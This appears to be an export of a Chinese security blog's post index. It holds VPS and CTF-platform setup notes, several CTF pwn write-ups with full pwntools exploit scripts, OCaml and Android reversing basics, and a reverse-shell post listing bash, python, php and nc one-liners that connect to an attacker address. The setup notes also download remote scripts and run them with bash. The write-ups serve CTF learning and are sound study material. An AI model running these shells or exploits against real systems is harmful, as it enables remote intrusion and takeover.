    <content type="text"><![CDATA[VPS购买VPS服务器推荐:在vultr官网购买,操作系统选centos6,centos7默认的防火墙可能会干扰SSR的正常连接. 如果开启vps的ipv6,可以在后台设置选项找到服务器ipv6 ip.在部署SSR账号时,用ipv6 ip就行.需要电脑系统开启ipv6. 部署VPS服务器远程登录到vps服务器,执行脚本. 12345yum -y install wget#安装wgetwget -N --no-check-certificate https://raw.githubusercontent.com/hombo125/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh#下载脚本并执行 此脚本是开机自动启动,部署一次即可. 加速VPS服务器使用谷歌BBR加速,vultr的服务器框架可以装BBR加速. 123456wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh#下载脚本chmod +x bbr.sh./bbr.sh#运行脚本 此脚本也是开机自动启动,部署一次即可.安装完后重启. 输入命令lsmod | grep bbr,如果出现tcp_bbr字样表示bbr已安装并启动成功. CTF平台docker,docker-compose安装123456789yum updateyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-cesystemctl start dockersystemctl enable dockeryum -y install epel-releaseyum -y install python-pippip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose 换源后重启docker服务即可. 1sudo vim /etc/docker/daemon.json 1&#123;"registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]&#125; CTFd搭建直接docker搭建即可. 123git clone https://github.com/CTFd/CTFd.gitcd CTFddocker run -d -p 8000:8000 -it ctfd/ctfd pwn题部署将程序io重定向到某端口. 1socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./test 基于xinted + docker. 12345git clone https://github.com/Eadom/ctf_xinetd.gitrm ctf_xinetd/bin/helloworldcp pwn ctf_xinetd/bin/pwnecho &lt;newflag&gt; &gt; ctf_xinetd/bin/flagvim ctf_xinetd/ctf.xinetd ctf.xinetd中主要修改server_args = --userspec=1000:1000 /home/ctf ./helloworld中的helloworld为二进制文件名称(pwn). 123cd ctf_xinetdsudo docker build -t "mypwn" .sudo docker run -d -p "0.0.0.0:8001:9999" -h "mypwn" --name="mypwn" mypwn pwn题要先关闭缓冲区. 123setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stdout, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL); 注意,docker里的libc文件可能与原生系统中的有细微区别,比如偏移.]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-nctf-2019-quals-pwn]]></title>
    <url>%2Fposts%2F7b4f1cc3%2F</url>
    <content type="text"><![CDATA[easy_rop考点 scanf %d的特殊情况. stack pivot. 环境ubuntu 16.04. 源代码12345678910111213141516171819202122232425262728293031//gcc easy_rop.c -z norelro -fPIE -pie -o easy_rop &amp;&amp; strip easy_rop#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int s[0x100];int name[0x50];void init_buf() &#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL);&#125;int main() &#123; int i; int number[26] = &#123;0&#125;; init_buf(); printf("Please input some number\n"); for(i = 0;i &lt; 34;i++) &#123; printf("number %d: ", i); scanf("%d", number + i); printf("number %d = %d\n", i, number[i]); &#125; write(1, "What's your name?\n", 18); read(0, s, 0x100); return 0;&#125; exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *def leak(): r.recvuntil(": ") r.sendline("+") r.recvuntil(" = ") data1 = int(r.recvline()) if data1 &lt; 0: data1 = data1 + 0x100000000 r.recvuntil(": ") r.sendline("+") r.recvuntil(" = ") data2 = int(r.recvline()) if data2 &lt; 0: data2 = data1 + 0x100000000 return data2 * 0x100000000 + data1def set(val): r.recvuntil(": ") r.sendline(str(val % 0x100000000)) r.recvuntil(": ") r.sendline(str(val / 0x100000000))r = process("./easy_rop")leak_list = []for i in range(15): leak_list.append(leak()) print hex(leak_list[i])pie = leak_list[14] - 0x5570b84d6b40 + 0x5570b84d6000set(pie + 0xb9d)set(pie + 0x201408)r.recvuntil("What's your name?\n")payload = p64(pie + 0xba3) + p64(1) + p64(pie + 0xba1) + p64(pie + 0x201238) + p64(0) + p64(pie + 0x820)payload += p64(pie + 0xba3) + p64(0) + p64(pie + 0xba1) + p64(pie + 0x201238) + p64(0) + p64(pie + 0x850)payload += p64(pie + 0x810)r.send(payload)libc = u64(r.recv(8)) + 0x7fd4b593c000 - 0x7fd4b59ab690r.send(p64(libc + 0x4526a))print "pie: " + hex(pie)print "libc: " + hex(libc)r.interactive() 遇到的问题本地跑,栈迁移之后使用puts后再使用read会发现read调用失败,原因未知,改用write. easy_heap考点 double free. 构造fake_fastbin_chunk_header. 环境ubuntu 16.04. 源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112//gcc easy_heap.c -z now -fstack-protector-all -o easy_heap &amp;&amp; strip easy_heap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;long long x[4];void * (ptr[0x10]);void init_buf() &#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); x[3] = 0x50;&#125;void menu() &#123; printf("What's your choice?\n"); printf("1. add heap\n"); printf("2. delete heap\n"); printf("3. show heap\n"); printf("4. exit\n");&#125;long long read_long_long() &#123; char buf[0x20]; read(0, buf, 0x20); buf[0xf] = 0; return atoll(buf);&#125;void add() &#123; int index; long long size; index = 0; while(ptr[index]) index++; if(index &gt;= 0x10) &#123; printf("heap is full!\n"); &#125; printf("What's your heap_size?\n"); size = read_long_long(); if(size &lt;= x[3]) &#123; ptr[index] = malloc(size); printf("What's your heap_content?\n"); read(0, ptr[index], size); printf("Success!\n"); &#125; else &#123; printf("Size is large!\n"); &#125;&#125;void delete() &#123; int index; printf("What's your heap_index?\n"); index = read_long_long(); if(index &lt; 0x10 &amp;&amp; index &gt;= 0 &amp;&amp; ptr[index]) &#123; free(ptr[index]); printf("Success!\n"); &#125; else &#123; printf("index is error!\n"); &#125;&#125;void show() &#123; int index; printf("What's your heap_index?\n"); index = read_long_long(); if(index &lt; 0x10 &amp;&amp; index &gt;= 0 &amp;&amp; ptr[index]) &#123; printf("This is heap%d: %s\n", index, ptr[index]); &#125; else &#123; printf("index is error!\n"); &#125;&#125;int main() &#123; int i; init_buf(); printf("What's your name?\n"); read(0, x, 0x10); printf("Hello %s!\n", x); while(1) &#123; menu(); i = read_long_long(); switch (i) &#123; case 1: add(); break; case 2: delete(); break; case 3: show(); break; default: exit(0); break; &#125; &#125; return 0;&#125; exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *def add(size, content): r.sendline("1") r.sendlineafter("What's your heap_size?\n", str(size)) r.sendafter("What's your heap_content?\n", content) r.recvuntil("4. exit\n")def dele(index): r.sendline("2") r.sendlineafter("What's your heap_index?\n", str(index)) r.recvuntil("4. exit\n")def show(index): r.sendline("3") r.sendlineafter("What's your heap_index?\n", str(index)) r.recvuntil(": ") data = r.recvline()[:-1] r.recvuntil("4. exit\n") return datar = process("./easy_heap")r.recvline("What's your name?\n")r.send(p64(0) + p64(0x61))r.recvuntil("4. exit\n")add(0x50, "w4rd3n")#0add(0x50, "w4rd3n")#1dele(0)dele(1)dele(0)add(0x50, p64(0x602060))add(0x50, "w4rd3n")add(0x50, "w4rd3n")add(0x50, p64(0) * 1 + p64(0xfffffffffffffff) + p64(0x601FB0) + p64(0) * 7)libc = u64(show(0).ljust(8, "\x00")) + 0x7f26f36a5000 - 0x7f26f3714690add(0x60, "w4rd3n")#1add(0x60, "w4rd3n")#2dele(1)dele(2)dele(1)add(0x60, p64(libc + 0x3c4b10 - 0x23))#3add(0x60, "w4rd3n")#4add(0x60, "w4rd3n")#5add(0x60, "0" * 0x13 + p64(libc + 0x45390))gdb.attach(r)print "libc: " + hex(libc)r.sendline("1")r.sendlineafter("What's your heap_size?\n", str(libc + 0x18cd57))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-collection]]></title>
    <url>%2Fposts%2F4eef53f0%2F</url>
    <content type="text"><![CDATA[shellcode方向jmp $与lea题目让你输入shellcode,然后用0xcc(int 3)分隔shellcode,留下空间分别为4,5,9,并清零rip外的寄存器. 短跳转jmp $ + n指令长度为2,使用其绕过0xcc.使用lea [rip + n]新建栈和其他参数. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *context.log_level = "debug"context.arch = "amd64"context.os = "linux"#context.aslr = Falser = process("./pwn")#gdb.attach(r, "b * 0x555555554a06\nc")#print len(asm("mov al, 59", arch = "amd64", os = "linux"))shellcode = asm("mov dl, 0xff; jmp $ + 9", arch = "amd64", os = "linux")shellcode = shellcode.ljust(9, "a")shellcode += asm("lea rsi, [rip - 0x12]", arch = "amd64", os = "linux")shellcode += asm("jmp $ + 3", arch = "amd64", os = "linux")shellcode += asm("syscall", arch = "amd64", os = "linux")r.sendafter("Give me your code:\n", shellcode.ljust(26, "a"))sleep(0.1)shellcode = ''' lea rsp, [rip - 0x18] push 0x68 mov rax, 0x732f2f2f6e69622f push rax mov rdi, rsp push 0x1010101 ^ 0x6873 xor dword ptr [rsp], 0x1010101 xor esi, esi push rsi push 8 pop rsi add rsi, rsp push rsi mov rsi, rsp xor edx, edx push 59 pop rax syscall'''shellcode = "a" * 0x17 + asm(shellcode)r.send(shellcode)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-buuctf]]></title>
    <url>%2Fposts%2F7d8dc2a1%2F</url>
    <content type="text"><![CDATA[ciscn_2019_n_112345678from pwn import *#r = process("./ciscn_2019_n_1")r = remote("node3.buuoj.cn", "28979")r.sendafter("the number.\n", p32(0x41348000) * 12 + "\n")print r.recvline()[:-1] ciscn_2019_en_2\x00截断即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = "debug"# r = process("./ciscn_2019_en_2")r = remote("node3.buuoj.cn", "26976")r.recvuntil("Input your choice!\n")r.sendline("1")r.recvuntil("be encrypted\n")payload = "\x00" * 0x58payload += p64(0x400c83) + p64(0x602020) + p64(0x4006E0)payload += p64(0x400790)r.sendline(payload)r.recvline()r.recvline()libc = u64(r.recvline()[:-1].ljust(8, "\x00")) - 0x809c0r.recvuntil("Input your choice!\n")r.sendline("1")r.recvuntil("be encrypted\n")payload = "\x00" * 0x58payload += p64(0x400c83) + p64(libc + 0x1b3e9a) + p64(libc + 0x4f440)payload += p64(0x400c83) + p64(libc + 0x1b3e9a) + p64(libc + 0x4f440)#加了一行是因为上面那次调用貌似被干掉了payload += p64(0x400790)r.sendline(payload)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-ocaml-基础]]></title>
    <url>%2Fposts%2F3b3b5732%2F</url>
    <content type="text"><![CDATA[环境配置与demoocaml安装:https://ocaml.org/docs/install.html. ocaml是一种声明式函数式编程语言,属于ML家族.在函数式语言中,函数是一等公民. 1234let average a b = (a +. b) /. 2.0;;(* (* 这是一个注释,而且可以嵌套 *) *)average 3.2 4.8;; let用于声明函数,acerage为函数名,a b用于声明形参,=后面为函数体,以;;为语句结束,+.和/.是浮点数对应的运算符(ocaml)用此自动推导类型.average 3.2 4.8为一次函数调用. 基本类型ocaml中的基本类型如下. int:在32位处理器上为31位有符号整数,在64位处理器上为63位有符号整数(ocaml内部使用int中的一位来自动管理内存). float:IEEE双精度浮点数,等同于C中的double. bool:布尔值. char:8位的字符值. string:字符串. unit:类似C中的void类型(如果一个函数没有返回值,就会显示返回unit类型). ocaml还提供nativeint类型(32/64位无符号整数). 显式转换由于ocaml不做任何的自动类型转换,所以提供了显示转换函数.如float_of_int将int转化为float,类似的还有:int_of_float,char_of_int,int_of_char,string_of_int. 函数函数定义0··C语言的函数定义. 123double average(double a, double b) &#123; return (a + b) / 2;&#125; 对应ocaml的函数定义,类似某些语言中的lambda表达式. 12let average a b = (a +. b) /. 2.0;; ocaml是强静态类型的语言,没有如perl中的动态类型. ocaml用类型推导(type inference)来找出类型,在交换环境中,终端会打印ocaml判断出的函数类型. ocaml不做任何的自动类型转换.浮点数必须写2.0,而2是一个整数. ocaml不允许任何形式的重载(包括操作符重载). ocaml返回函数的最后的表达式值. 函数调用C语言的函数调用. 123repeated("hello", 3)repeated(prompt_string("Name please: "), 3) 对应ocaml的函数调用. 12345repeated "hello" 3(* ocaml中repeated("hello", 3)表示函数的第一个参数为一个pair:("hello", 3). *)repeated (prompt_string "Name please: ") 3(* prompt_string的返回值由括号括起,作为第一个参数传入 *) 在ocaml的函数调用中括号只括起整个函数调用,不要括起函数调用的参数. 递归函数和C语言不同,ocaml中的函数一般不允许递归自身的,需要用let rec代替let来定义递归函数. 123let rec range a b = if a &gt; b then [] else a :: range (a + 1) b;; let和let rec的唯一区别是函数名的定义域.如果用let定义的,那么调用range会试图寻找一个已经存在的range的函数,而不是现在正在被定义的函数.用let或let rec定义的函数并没有性能上的差别. 多态函数如果一个函数的参数可以是任何类型怎么办. 1let give_me_a_three x = 3;; ocaml使用一个特殊的占位符来表示任意类型,即一个单引号后加一个字母. 例如:give_me_a_three : &#39;a -&gt; int,这里&#39;a表示任意类型. 嵌套函数ocaml支持嵌套函数. 123456789101112let read_whole_channel chan = let buf = Buffer.create 4096 in let rec loop () = let newline = input_line chan in Buffer.add_string buf newline; Buffer.add_char buf '\n'; loop () in try loop () with End_of_file -&gt; Buffer.contents buf;; 绑定与引用任何let ...,无论是在全局还是在一个函数中,被称作let-binding,其不会显式创建对象. ocaml使用ref显式创建一个对象并返回引用. let-局部表达式ocaml允许在函数中局部定义一个绑定值得局部变量(无法赋值),类似缩略名. 12345678910let average a b = let sum = a +. b in sum /. 2.0;;(* sum只是表达式a +. b值的局部绑定,无法给sum赋值或改值. *)let positive_sum a b = let a = max a 0 and b = max b 0 in a + b;;(* let中的标识符a和b重新定义了所绑定的值,类似C语言中代码块中的局部变量,但只有值 *) let-全局表达式类似局部表达式,只不过作用域为全局,同样也只是值. ref-创建引用12let my_ref = ref 0;;(* 此时my_ref绑定了一个int对象,其值为0 *) 可以对这种对象赋值. 123my_ref := 100;;!my_ref(* !表示解引用,类似C语言的* *)]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>ocaml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-redhat-2019-finals]]></title>
    <url>%2Fposts%2Fa1b93287%2F</url>
    <content type="text"><![CDATA[粤湾证券纯逆向,xctf final上有类似的题,不过这里由于靶机不会patch,所以失去了对抗的效果. 123456789101112131415161718192021222324252627282930313233343536from pwn import *import base64context.log_level = 'debug'# context.aslr = Falsefd = open("/defense", "wb")# fd.write(p64(0x20) + "system".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "execve".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "open".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "free".ljust(8, "\x00") + p64(0))# fd.write(p64(0x20) + "malloc".ljust(8, "\x00") + p64(0))fd.close()# r = process("./pwn")r = remote("172.16.9.41", "9002")r.recvuntil("gift:")libc = int(r.recvline(), 16)bin_sh_offset = 0x1b3e9a#0x1b3e9a#0x18cd57payload = p64(0x10) + "\x00".ljust(8, "\x00") + p64(libc + bin_sh_offset)payload += p64(0x40) + "system".ljust(8, "\x00") + p64(0)payload = base64.b64encode(payload)# bp = "b * 0x19b7 + 0x555555554000\n"# bp += "b * 0x157A + 0x555555554000\n"# bp += "b * 0x1170 + 0x555555554000\n"# gdb.attach(r, bp + "c")r.send(payload)r.interactive() 粤湾银行纯逆向,相当于定义了一堆操作码,然后通过shellcode获取shell,主要过程在于读懂程序逻辑. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context.log_level = 'debug'#context.aslr = Falsedef new(content): r.sendafter("&gt;&gt;&gt; ", "1" + p64(0)) r.send(content) data = r.recvline() return datadef play(): r.sendafter("&gt;&gt;&gt; ", "2" + p64(0))def dele(): r.sendafter("&gt;&gt;&gt; ", "3" + p64(0))# r = process("./pwn", env = &#123;"LD_PRELOAD" : "./libc32.so"&#125;)r = remote("172.16.9.41", "9003")payload = p8(0x73) + p32(0x804B028)payload += p8(0x40) + p8(0x03) + p8(0x4a)payload += p8(0x10) + p8(0x01)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x01)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x01)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x01)print new(payload + p8(0xb0))play()libc = u8(r.recv(1))libc += u8(r.recv(1)) * 0x100libc += u8(r.recv(1)) * 0x10000libc += u8(r.recv(1)) * 0x1000000system = libc + 0x2a906940 - 0x2a92b140payload = p8(0x73) + p32(0x804B018)payload += p8(0x40) + p8(0x03) + p8(0x4a)payload += p8(0x10) + p8(0x00)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x00)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x00)payload += p8(0x20) + p8(0x03)payload += p8(0x10) + p8(0x00)payload += p8(0x43) + p8(0) + "/bin"payload += p8(0x43) + p8(1) + "/sh\x00"print new(payload + p8(0xb0))play()r.send(p32(system))# bp = "b * 0x8048743\n"# gdb.attach(r, bp + "c")print "system: " + hex(system)r.interactive() 粤湾中心先逆向逻辑,通过整数溢出(也不算)读取到bss段数据,使用了dup2将flag文件的描述符复制,所以读取stdin覆盖stack指针然后push覆盖fileno输出flag. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level = 'debug'#context.aslr = Falser = process("./pwn")r.sendlineafter("EIP: ", "0")r.sendlineafter("ESP: ", "27")code = ""code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 5) + "\n"#reg[1] = 5code += str((0xD0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] -= reg[1] = -5code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 4) + "\n"#reg[1] = 4code += str((0xC0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] *= reg[1] = -20code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 2) + "\n"#reg[1] = 2code += str((0x42 &lt;&lt; 16) + (1 &lt;&lt; 8) + 0) + "\n"#reg[reg[1]] = data[reg[0]] &lt;=&gt; reg[2] = data[-20]code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 1) + "\n"#reg[1] = 1code += str((0xA0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] += 1 = -19code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 3) + "\n"#reg[1] = 3code += str((0x42 &lt;&lt; 16) + (1 &lt;&lt; 8) + 0) + "\n"#reg[reg[1]] = data[reg[0]] &lt;=&gt; reg[3] = data[-19]code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 8) + "\n"#reg[7] = 8code += str((0xD0 &lt;&lt; 16) + (6 &lt;&lt; 8) + 7) + "\n"#reg[6] -= reg[7] = -8code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 2) + "\n"#reg[7] = 2code += str((0xD0 &lt;&lt; 16) + (6 &lt;&lt; 8) + 7) + "\n"#reg[6] -= reg[7] = -10code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 4) + "\n"#reg[7] = 4code += str((0x41 &lt;&lt; 16) + (6 &lt;&lt; 8) + 2) + "\n"#data[reg[6]] = reg[2]code += str((0x40 &lt;&lt; 16) + (7 &lt;&lt; 8) + 1) + "\n"#reg[7] = 1code += str((0xA0 &lt;&lt; 16) + (6 &lt;&lt; 8) + 7) + "\n"#reg[6] += 1 = -9code += str((0x41 &lt;&lt; 16) + (6 &lt;&lt; 8) + 3) + "\n"#data[reg[6]] = reg[3]#19code += str((0x40 &lt;&lt; 16) + (0 &lt;&lt; 8) + 8) + "\n"#reg[0] = 8code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 8) + "\n"#reg[1] = 8code += str((0xC0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] *= reg[1] = 64code += str((0xC0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 1) + "\n"#reg[0] *= reg[1] = 512code += str((0x40 &lt;&lt; 16) + (2 &lt;&lt; 8) + 6) + "\n"#reg[2] = 6code += str((0xC0 &lt;&lt; 16) + (2 &lt;&lt; 8) + 1) + "\n"#reg[2] *= reg[1] = 48code += str((0x40 &lt;&lt; 16) + (1 &lt;&lt; 8) + 3) + "\n"#reg[1] = 3code += str((0xA0 &lt;&lt; 16) + (2 &lt;&lt; 8) + 1) + "\n"#reg[2] += 3 = 51code += str((0xA0 &lt;&lt; 16) + (0 &lt;&lt; 8) + 2) + "\n"#reg[0] += 51 = 563code += str((0x70 &lt;&lt; 16) + (0 &lt;&lt; 8) + 0) + "\n"#push 563#29r.sendlineafter("Give me code length: \n", "29")gdb.attach(r)r.sendafter("Give me code: \n", code)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-penetration-反弹shell]]></title>
    <url>%2Fposts%2Fb33c21f9%2F</url>
    <content type="text"><![CDATA[概念攻击者指定服务端,受害者主机主动连接攻击者的服务端程序,就叫反弹shell,通常用于被控端因防火墙受限,权限不足,端口被占用等情形. 反弹shell命令外网主机监听端口. 123nc -lvvp 9999 -t -e /bin/bash#-t:tcp#-e:运行程序 目标机运行一下命令连接,注意需要设置防火墙. bash版本.由解析shell的bash完成,所以某些情况下不支持. 12345bash -i &gt;&amp; /dev/tcp/192.168.100.1/9999 0&gt;&amp;1#bash -i:产生bash交互环境#&gt;&amp;:将前面的内容与后面结合并重定向到后者#/dev/tcp/192.168.100.1/9999:Linux一切皆文件,这里表示建立一个到192.168.100.1:9999的tcp连接#0&gt;&amp;1:将标准输入重定向给标准输出 python版本. 1python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.100.1", 9999)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/sh", "-i"]);' php版本. 1php -r '$sock = fsockopen("192.168.100.1", 9999); exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' nc版本. 1nc -t -e /bin/sh 192.168.100.1 9999 1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.100.1 9999 &gt;/tmp/f 1nc 192.168.100.1 2333 | /bin/sh | nc 192.168.100.1 9999]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>penetration</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-Android-基础]]></title>
    <url>%2Fposts%2F9b2b8f38%2F</url>
    <content type="text"><![CDATA[APKAPK是一种归档文件,实质就是一个特殊的zip.内容主要有:应用模块,也就是源代码,资源文件,aidl接口文件.还有就是依赖模块即第三方依赖库,aar,jar,so文件. 首先打包资源文件生成R.java,编译aidl生成java接口文件,将源代码编译成dex(Dalvik Executable,Android系统为每一个APP创建一个Dalvik虚拟机)文件,最后将编译后的文件打包成一个APK压缩包. 使用到的工具:aapt.exe/aapt2.exe,资源打包工具;javac.exe,将java转成class;dx.jar,将class转成dex文件. 逆向APK破解流程:反编译apk,定位关键代码,功能分析,smali修改,重打包,签名,安装. 反编译常用工具:apktool,jeb,smali/baksmali,AndroidKiller等. 1234java -jar apktool.jar d demo.apk -o out#逆向APKjava -jar apktool.jar b demo#重打包APK 定位关键代码一般通过:资源引用法,猜测法,交叉引用法.然后分析代码明白程序功能. AndroidManifest.xml文件用于活动的声明与权限的描述.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-强网杯-2019-babycpp]]></title>
    <url>%2Fposts%2F7d044205%2F</url>
    <content type="text"><![CDATA[babycppupdate函数中经典abs漏洞,可以修改vtable指针,爆破4位(1/16). 通过string和int四个函数交互使用任意地址读写,通过libc中的environ变量泄露栈地址,最后写返回地址rop即可. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *context.log_level = 'debug'def new_array(choice): r.sendlineafter("Your choice:", "0") r.sendlineafter("Your choice:", str(choice))def show(index, idx): r.sendlineafter("Your choice:", "1") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx))def set_element_int(index, idx, val): r.sendlineafter("Your choice:", "2") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx)) r.sendlineafter("Input val:", hex(val))def set_element_string(index, idx, content, len = -1): r.sendlineafter("Your choice:", "2") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx)) if len != -1: r.sendlineafter("len of the obj:", str(len)) r.sendafter("Input your content:", content)def update(index, idx, content): r.sendlineafter("Your choice:", "3") r.sendlineafter("Input array hash:", p8(index) + p8(0)) r.sendlineafter("Input idx:", str(idx)) r.sendafter("Input hash:", content)while(1): r = process("./babycpp") new_array(2)#0 new_array(1)#1 set_element_string(0, 0, "w4rd3n", 0x100) update(0, 0x80000000, p16(0x1ce0)) try: show(0, 0) heap = int(r.recvline().split()[-1], 16) except EOFError as e: r.close() continue breakupdate(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(heap - 0xc0) + p64(0x100))update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))show(0, 0)pie = u64(r.recvline()[8:-1].ljust(8, "\x00")) - 0x201ce0update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(pie + 0x202030) + p64(0x100))update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))show(0, 0)libc = u64(r.recvline()[8:-1].ljust(8, "\x00")) - 0x7fdef0e348e0 + 0x7fdef0a70000update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(libc + 0x3c6f38) + p64(0x100))#environupdate(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))show(0, 0)stack = u64(r.recvline()[8:-1].ljust(8, "\x00"))main_ret = stack - 0xf0update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(main_ret) + p64(0x100))update(0, 0x80000000, p16(0x1ce0))set_element_int(0, 0, heap + 0x20)update(0, 0x80000000, p16(0x1d00))set_element_string(0, 0, p64(pie + 0x1693) + p64(libc + 0x18cd57) + p64(libc + 0x45390))r.sendlineafter("Your choice:", "4")#gdb.attach(r)print "pie: " + hex(pie)print "heap: " + hex(heap)print "libc: " + hex(libc)print "main_ret: " + hex(main_ret)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-pwn-劫持控制流]]></title>
    <url>%2Fposts%2Fd702cd8%2F</url>
    <content type="text"><![CDATA[返回地址最直接的劫持方法,需要栈溢出,越界读写,格式化字符串之类的漏洞,或者泄露栈地址的任意写. got表got表未开保护的情况下可以覆写got表. vtable各种函数表,典型有IO_FILE结构体的vtable和CPP中每个类的虚函数表. hook变量当_malloc_hook不为NULL时会执行*_malloc_hook,调用malloc时触发. 当_free_hook不为NULL时会执行*_free_hook,调用free时触发. 当_dl_open_hook不为NULL时会执行**_dl_open_hook,常见触发条件是当malloc或free出错时.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Linux-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-Linux-kvm-基础]]></title>
    <url>%2Fposts%2F34a42725%2F</url>
